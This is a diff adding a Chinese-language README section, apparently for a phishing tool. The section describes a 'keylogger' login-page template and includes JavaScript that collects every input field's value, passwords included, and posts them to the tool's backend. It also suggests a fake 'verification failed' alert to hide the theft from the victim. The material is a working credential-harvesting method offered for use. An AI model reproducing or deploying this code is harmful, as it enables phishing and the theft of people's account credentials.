@@ -20,6 +20,37 @@
 
 ```
 
+
+## 密码记录
+
+![](images/body.png)
+
+可以参考`/static/template/front_login_keylogger.html`文件
+
+所有`input`标签的内容都会被提交到后端,引用`<script src="/static/dist/login.js"></script>`并把登录按钮绑定到`login_submit()`函数即可
+
+你也可以自定义`login.js`,并控制登录之后的返回信息
+
+比如说点击登录之后执行`alert('帐号/密码校验不通过')`
+
+```js
+function login_submit() {
+    var input = document.getElementsByTagName('input')
+    var data = ''
+    for (var i = 0; i < input.length; i++) {
+        const put = input[i]
+        var name = ''
+        if (put.className) name = '_' + put.className
+        if (put.name) name = '_' + put.name
+        var key = `input[${i}${name}]=${put.value}`;
+        data = data + key + '&'
+    }
+    if (data != '') post(data)
+    console.log(data)
+}
+```
+
+
 ## 模板修改
 
 打开`static/template/`目录,默认有俩个模板,分别是`front_login_1.html`和`front_login.html`
